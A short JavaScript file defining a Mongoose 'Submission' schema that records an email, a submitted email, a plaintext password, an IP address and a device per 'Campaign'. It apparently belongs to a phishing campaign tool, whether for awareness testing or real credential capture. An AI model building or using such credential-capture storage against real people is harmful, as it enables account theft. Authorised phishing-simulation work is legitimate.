import mongoose from 'mongoose';
const { Schema } = mongoose;

const submissionSchema = new Schema({
    email: {
        type: String,
        required: true,
        trim: true,
        lowercase: true,
    },
    submittedEmail: {
        type: String,
        required: true,
    },
    password: {
        type: String,
        required: true
    },
    ipAddress: {
        type: String,
        trim: true
    },
    device: {
        type: String,
        trim: true
    },
    campaign: {
        type: Schema.Types.ObjectId,
        ref: 'Campaign', // Assuming there is a Campaign model
        required: true
    }
}, { timestamps: true });

const Submission = mongoose.model('Submission', submissionSchema);
export default Submission;